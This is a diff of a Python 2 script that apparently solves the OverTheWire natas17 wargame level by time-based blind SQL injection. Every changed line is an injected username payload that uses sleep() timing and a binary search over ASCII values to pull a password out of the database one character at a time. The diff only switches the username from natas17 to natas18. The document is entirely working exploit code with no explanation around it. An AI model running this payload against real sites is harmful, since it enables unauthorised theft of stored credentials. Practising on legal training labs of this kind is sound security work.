@@ -10,12 +10,12 @@ for i in range(1,33):
 	en = 122
 	while(True):
 		mid = (st + en) / 2
-		Data = {'username':'natas17"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(1),sleep(0))-- -'}
+		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(1),sleep(0))-- -'}
 		t = time.time()
 		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 		t = time.time() - t
 		if t >= 1:
-			Data = {'username':'natas17"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(1),sleep(0))-- -'}
+			Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))='+str(mid)+',sleep(1),sleep(0))-- -'}
 			t = time.time()
 			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 			t = time.time() - t
@@ -23,12 +23,12 @@ for i in range(1,33):
 				passwd += chr(mid)
 				print "Password: " + passwd
 				break
-		Data = {'username':'natas17"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
+		Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
 		t = time.time()
 		r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 		t = time.time() - t
 		if t >= 1:
-			Data = {'username':'natas17"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
+			Data = {'username':'natas18"+-+if(ascii(substring(password,'+ str(i) +',1))>'+str(mid)+',sleep(1),sleep(0))-- -'}
 			t = time.time()
 			r = requests.post("http://natas17.natas.labs.overthewire.org/index.php", headers = {"Authorization":auth}, data = Data)
 			t = time.time() - t
